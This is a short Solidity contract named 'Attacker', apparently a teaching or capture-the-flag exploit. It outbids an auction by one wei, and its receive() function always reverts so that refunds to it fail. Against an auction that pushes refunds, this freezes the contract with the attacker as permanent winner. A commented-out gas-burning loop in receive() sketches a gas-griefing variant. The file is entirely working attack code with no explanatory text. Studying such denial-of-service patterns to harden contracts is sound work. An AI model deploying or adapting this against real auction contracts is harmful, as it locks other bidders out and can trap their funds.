// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IAuction {
    function bid() external payable;
    function getHighestBid() external view returns(uint256);
}

contract Attacker {

    constructor(address _auction) {
        auction = IAuction(_auction);
    }

    IAuction public auction;

    function attack() external payable {
        auction.bid{value: getWinningAmount()}();
    }

    function getWinningAmount() public view returns(uint256) {
        return auction.getHighestBid() + 1;
    }

    receive() external payable {
        revert("NUHAY BEBRU");

        //         while (gasleft() > 10_000) {
        //             assembly {
        //                 mstore(0x0, number())
        //                 pop(keccak256(0x0, 0x20))
        //             }
        //     }
    }
    

}